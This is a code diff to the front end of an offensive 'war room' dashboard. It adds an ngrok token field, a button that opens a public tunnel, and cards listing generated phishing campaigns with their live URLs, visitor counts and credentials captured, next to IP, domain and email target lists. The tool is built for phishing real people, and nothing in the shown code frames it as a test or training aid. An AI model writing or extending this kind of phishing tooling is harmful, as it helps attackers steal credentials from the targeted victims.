@@ -273,6 +273,98 @@
             display: block;
         }
         
+        /* === NGROK TOKEN INPUT === */
+        .ngrok-token-section {
+            background: linear-gradient(45deg, var(--shadow-void), var(--steel-gray));
+            border: 2px solid var(--toxic-green);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        
+        .token-input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .token-input {
+            flex: 1;
+            background: var(--shadow-void);
+            border: 1px solid var(--steel-gray);
+            border-radius: 5px;
+            color: white;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .token-btn {
+            background: linear-gradient(45deg, var(--toxic-green), var(--neon-cyan));
+            border: 1px solid var(--toxic-green);
+            border-radius: 5px;
+            color: black;
+            padding: 10px 15px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        /* === PHISHING LINK DISPLAY === */
+        .phishing-links-container {
+            margin: 15px 0;
+        }
+        
+        .phishing-link-card {
+            background: var(--shadow-void);
+            border: 2px solid var(--neon-cyan);
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 10px;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        .link-header {
+            display: flex;
+            justify-content: between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .platform-badge {
+            background: var(--neon-cyan);
+            color: black;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+        
+        .link-url {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .link-url a {
+            color: var(--toxic-green);
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .link-url a:hover {
+            text-decoration: underline;
+        }
+        
+        .link-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            font-size: 0.8em;
+            color: #888;
+        }
+        
         /* === STATUS FEEDS === */
         .status-feed {
             background: rgba(0, 0, 0, 0.7);
@@ -343,29 +435,6 @@
             letter-spacing: 1px;
         }
         
-        /* === NGROK URL DISPLAY === */
-        .ngrok-url {
-            background: var(--shadow-void);
-            border: 2px solid var(--toxic-green);
-            border-radius: 8px;
-            padding: 15px;
-            margin: 15px 0;
-            text-align: center;
-            animation: pulse-glow 2s infinite;
-        }
-        
-        .ngrok-url a {
-            color: var(--toxic-green);
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 1.1em;
-            word-break: break-all;
-        }
-        
-        .ngrok-url a:hover {
-            text-decoration: underline;
-        }
-        
         /* === ANIMATIONS === */
         @keyframes float {
             0%, 100% { transform: translateY(-50%) translateX(0); }
@@ -418,6 +487,21 @@
     <div class="war-room">
         <!-- SIDEBAR - TARGET MANAGEMENT -->
         <div class="targets-sidebar">
+            <!-- NGROK TOKEN SECTION -->
+            <div class="sidebar-section">
+                <div class="section-title">🌐 NGROK SETUP</div>
+                <div class="ngrok-token-section">
+                    <div class="control-label">Ngrok Auth Token</div>
+                    <div class="token-input-group">
+                        <input type="password" class="token-input" id="ngrok-token" placeholder="Enter your ngrok token">
+                        <button class="token-btn" onclick="saveNgrokToken()">SAVE</button>
+                    </div>
+                    <div style="font-size: 0.8em; color: #888; margin-top: 8px;">
+                        Get free token: <a href="https://dashboard.ngrok.com/get-started/your-authtoken" target="_blank" style="color: var(--neon-cyan);">ngrok.com</a>
+                    </div>
+                </div>
+            </div>
+
             <!-- IP Targets -->
             <div class="sidebar-section">
                 <div class="section-title">🎯 IP TARGETS</div>
@@ -499,13 +583,12 @@
                         
                         <div class="attack-controls">
                             <button class="web-btn" onclick="generatePhishing()">🎣 GENERATE PHISHING</button>
-                            <button class="web-btn" onclick="startNgrok()">🌐 START NGROK</button>
+                            <button class="web-btn" onclick="startNgrok()">🌐 START NGROK TUNNEL</button>
                         </div>
                         
-                        <!-- NGROK URL Display -->
-                        <div class="ngrok-url" id="ngrok-url" style="display: none;">
-                            <div>🌐 LIVE PHISHING URL:</div>
-                            <a id="ngrok-link" target="_blank">Loading...</a>
+                        <!-- PHISHING LINKS DISPLAY -->
+                        <div class="phishing-links-container" id="phishing-links-container">
+                            <!-- Phishing links will appear here -->
                         </div>
                         
                         <div class="status-feed" id="phishing-status">
@@ -610,15 +693,56 @@
     <script>
         // Global state
         let targets = { ips: [], domains: [], emails: [] };
-        let ngrokUrl = null;
-        let activeCampaigns = 0;
+        let ngrokToken = localStorage.getItem('ngrok_token') || '';
+        let activeCampaigns = [];
+        let ngrokTunnelActive = false;
 
         // Initialize dashboard
         async function initializeDashboard() {
             await loadTargets();
             await loadDashboardStats();
             updateTargetSelectors();
+            loadNgrokToken();
             setInterval(loadDashboardStats, 3000);
+        }
+
+        // Load ngrok token from localStorage
+        function loadNgrokToken() {
+            const savedToken = localStorage.getItem('ngrok_token');
+            if (savedToken) {
+                document.getElementById('ngrok-token').value = savedToken;
+                ngrokToken = savedToken;
+                addStatus('phishing-status', 'Ngrok token loaded from storage', 'success');
+            }
+        }
+
+        // Save ngrok token
+        async function saveNgrokToken() {
+            const token = document.getElementById('ngrok-token').value.trim();
+            if (!token) {
+                addStatus('phishing-status', 'Please enter ngrok token', 'error');
+                return;
+            }
+
+            localStorage.setItem('ngrok_token', token);
+            ngrokToken = token;
+            
+            try {
+                const response = await fetch('/api/ngrok/set-token', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ token: token })
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    addStatus('phishing-status', 'Ngrok token saved and configured!', 'success');
+                } else {
+                    addStatus('phishing-status', result.error, 'error');
+                }
+            } catch (error) {
+                addStatus('phishing-status', 'Token saved locally', 'warning');
+            }
         }
 
         // Load targets from API
@@ -669,7 +793,7 @@
                 const stats = await response.json();
                 
                 document.getElementById('stat-targets').textContent = stats.total_targets;
-                document.getElementById('stat-campaigns').textContent = stats.active_phishing;
+                document.getElementById('stat-campaigns').textContent = activeCampaigns.length;
                 document.getElementById('stat-ai').textContent = stats.ai_intelligence.toFixed(1);
                 document.getElementById('ai-level').textContent = stats.ai_intelligence.toFixed(1);
             } catch (error) {
@@ -730,6 +854,11 @@
             const email = document.getElementById('phishing-email').value;
             const message = document.getElementById('phishing-message').value;
 
+            if (!ngrokToken && !ngrokTunnelActive) {
+                addStatus('phishing-status', 'Please set ngrok token first!', 'error');
+                return;
+            }
+
             try {
                 const response = await fetch('/api/phishing/generate', {
                     method: 'POST',
@@ -743,23 +872,61 @@
                 });
                 
                 const result = await response.json();
-                activeCampaigns++;
+                
+                // Add to active campaigns
+                activeCampaigns.push(result);
                 
                 addStatus('phishing-status', `Generated ${platform} phishing campaign`, 'success');
                 addStatus('phishing-status', `Campaign ID: ${result.id}`, 'info');
                 
-                // If ngrok URL is available, show it
-                if (result.ngrok_url) {
-                    showNgrokUrl(result.ngrok_url);
-                }
+                // Display the phishing link
+                displayPhishingLink(result);
                 
             } catch (error) {
                 addStatus('phishing-status', `Error generating phishing: ${error}`, 'error');
             }
         }
 
+        // Display phishing link
+        function displayPhishingLink(campaign) {
+            const container = document.getElementById('phishing-links-container');
+            
+            const linkCard = document.createElement('div');
+            linkCard.className = 'phishing-link-card';
+            
+            const platform = campaign.platform.charAt(0).toUpperCase() + campaign.platform.slice(1);
+            
+            linkCard.innerHTML = `
+                <div class="link-header">
+                    <span class="platform-badge">${platform}</span>
+                    <span style="color: #888; font-size: 0.8em;">ID: ${campaign.id}</span>
+                </div>
+                <div class="link-url">
+                    ${campaign.live_url ? 
+                        `<a href="${campaign.live_url}" target="_blank">${campaign.live_url}</a>` :
+                        'Generating public URL...'
+                    }
+                </div>
+                <div class="link-stats">
+                    <div>Visitors: ${campaign.visitors || 0}</div>
+                    <div>Credentials: ${campaign.credentials_captured || 0}</div>
+                    <div>Status: ${campaign.status}</div>
+                </div>
+            `;
+            
+            container.appendChild(linkCard);
+            
+            // Scroll to show new link
+            linkCard.scrollIntoView({ behavior: 'smooth' });
+        }
+
         // Ngrok functions
         async function startNgrok() {
+            if (!ngrokToken) {
+                addStatus('phishing-status', 'Please set ngrok token first!', 'error');
+                return;
+            }
+
             try {
                 const response = await fetch('/api/ngrok/start', {
                     method: 'POST',
@@ -768,23 +935,23 @@
                 
                 const result = await response.json();
                 if (result.success) {
-                    showNgrokUrl(result.ngrok_url);
-                    addStatus('phishing-status', 'Ngrok tunnel activated', 'success');
+                    ngrokTunnelActive = true;
+                    addStatus('phishing-status', 'Ngrok tunnel activated!', 'success');
+                    addStatus('phishing-status', `Public URL: ${result.ngrok_url}`, 'info');
+                    
+                    // Update existing campaigns with new URLs
+                    activeCampaigns.forEach(campaign => {
+                        if (campaign.live_url) {
+                            campaign.live_url = campaign.live_url.replace(/https?:\/\/[^\/]+/, result.ngrok_url);
+                        }
+                    });
+                    
+                } else {
+                    addStatus('phishing-status', `Ngrok error: ${result.error}`, 'error');
                 }
             } catch (error) {
                 addStatus('phishing-status', `Error starting ngrok: ${error}`, 'error');
             }
-        }
-
-        function showNgrokUrl(url) {
-            const ngrokDiv = document.getElementById('ngrok-url');
-            const ngrokLink = document.getElementById('ngrok-link');
-            
-            ngrokLink.href = url;
-            ngrokLink.textContent = url;
-            ngrokDiv.style.display = 'block';
-            
-            addStatus('phishing-status', `Live URL: ${url}`, 'success');
         }
 
         // Network scanning
